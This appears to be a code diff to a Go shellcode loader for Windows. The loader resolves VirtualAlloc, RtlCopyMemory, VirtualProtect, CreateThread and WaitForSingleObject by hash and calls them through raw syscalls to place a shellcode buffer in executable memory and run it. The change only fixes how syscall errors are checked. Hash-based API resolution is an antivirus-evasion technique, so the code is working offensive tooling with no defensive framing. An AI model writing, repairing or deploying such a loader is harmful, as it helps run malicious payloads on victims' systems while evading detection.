@@ -26,7 +26,6 @@ var (
 	VirtualProtectHash      = 0xe857500d
 	CreateThreadHash        = 0x98baab11
 	WaitForSingleObjectHash = 0xdf1b3da
-	syscallSuccess          = "The operation completed successfully."
 )
 
 type ImageFileHeader struct {
@@ -96,7 +95,7 @@ func getFunctionAddressbyHash(library string, hash int) uintptr {
 
 	// Get library base.
 	libraryBase, err := inject.LoadLibraryA(library)
-	if err.Error() != syscallSuccess {
+	if err != windows.Errno(0) {
 		fmt.Printf("%s\n", err)
 	}
 
@@ -172,7 +171,7 @@ func main() {
 	if customVirtualAlloc != 0x00 {
 
 		address, _, err = syscall.Syscall6(customVirtualAlloc, 4, uintptr(0), uintptr(len(sc)), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE, 0, 0)
-		if err.Error() != syscallSuccess {
+		if err != windows.Errno(0) {
 			fmt.Printf("%s\n", err)
 		}
 	}
@@ -182,7 +181,7 @@ func main() {
 	if customRtlCopyMemory != 0x00 {
 
 		_, _, err := syscall.Syscall(customRtlCopyMemory, 3, address, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
-		if err.Error() != syscallSuccess {
+		if err != windows.Errno(0) {
 			fmt.Printf("%s\n", err)
 		}
 	}
@@ -192,7 +191,7 @@ func main() {
 	if customVirtualProtect != 0x00 {
 		var oldProtect uint32
 		_, _, err := syscall.Syscall6(customVirtualProtect, 4, address, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, (uintptr)(unsafe.Pointer(&oldProtect)), 0, 0)
-		if err.Error() != syscallSuccess {
+		if err != windows.Errno(0) {
 			fmt.Printf("%s\n", err)
 		}
 	}
@@ -203,7 +202,7 @@ func main() {
 	if customCreateThread != 0x00 {
 
 		thread, _, err = syscall.Syscall6(customCreateThread, 6, 0, 0, address, uintptr(0), 0, 0)
-		if err.Error() != syscallSuccess {
+		if err != windows.Errno(0) {
 			fmt.Printf("%s\n", err)
 		}
 	}
@@ -212,7 +211,7 @@ func main() {
 	customWaitForSingleObject := getFunctionAddressbyHash("kernel32", WaitForSingleObjectHash)
 	if customWaitForSingleObject != 0x00 {
 		_, _, err := syscall.Syscall(customWaitForSingleObject, 2, thread, 0xFFFFFFFF, 0)
-		if err.Error() != syscallSuccess {
+		if err != windows.Errno(0) {
 			fmt.Printf("%s\n", err)
 		}
 	}
